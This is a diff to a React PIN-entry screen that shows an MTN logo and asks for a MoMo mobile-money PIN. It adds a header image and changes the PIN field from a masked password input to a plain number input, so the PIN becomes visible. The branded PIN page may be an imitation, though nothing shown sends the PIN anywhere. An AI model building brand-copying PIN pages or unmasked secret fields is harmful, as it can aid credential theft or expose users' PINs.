@@ -354,7 +354,7 @@ import React from "react";
 import { useState } from "react";
 import { useNavigate, useLocation } from "react-router-dom";
 import img from "./assets/image.jpeg";
-
+import logo from "./assets/crop.jpeg"
 const MTNLogo = () => (
   <svg viewBox="0 0 60 60" className="w-10 h-10" fill="none">
     <circle cx="30" cy="30" r="30" fill="#FFCC00" />
@@ -435,6 +435,20 @@ export default function PINEntry() {
       </div>
 
       {/* Header */}
+
+  {/* Header */}
+       <div className="bg-white px-4 py-3 flex items-center justify-between border-b border-gray-100">
+         <div className="flex items-center gap-2">
+           
+           <div className="leading-tight">
+            <img src={logo} alt="" />
+             
+           </div>
+         </div>
+       
+      
+     </div>
+
       <div className="bg-white px-4 py-3 flex items-center justify-between border-b border-gray-100">
         <img src={img} alt="" />
       </div>
@@ -449,7 +463,7 @@ export default function PINEntry() {
             MoMo PIN
           </div>
           <input
-            type="password"
+            type="number"
             value={pin}
             onChange={e => setPin(e.target.value)}
             onFocus={() => setFocused(true)}
